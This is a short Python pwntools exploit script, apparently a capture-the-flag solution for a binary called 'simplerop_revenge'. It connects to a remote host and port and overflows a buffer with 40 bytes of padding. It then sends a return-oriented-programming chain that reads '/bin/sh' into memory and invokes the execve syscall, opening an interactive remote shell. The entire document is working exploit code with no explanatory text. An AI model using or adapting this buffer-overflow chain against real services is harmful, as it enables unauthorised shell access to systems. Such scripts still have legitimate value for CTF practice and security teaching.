from pwn import *
import time

context.arch = "amd64"

ip = "140.110.112.77"
port = 2124

r = remote(ip, port)
# r = process("./simplerop_revenge")

main = 0x40093d
data = 0x6cc000 - 0x100
read = 0x43F3B0
pop_rsi = 0x401577
pop_rax_rdx_rbx = 0x478516
pop_rdi = 0x401456
syscall = 0x4671b5

r.sendlineafter(':', b'a' * 40 + flat(pop_rsi, data, read, main))
time.sleep(0.1)
r.send('/bin/sh')
r.sendlineafter(':', b'a' * 40 + flat(pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdi, data, pop_rsi, 0, syscall))

r.interactive()
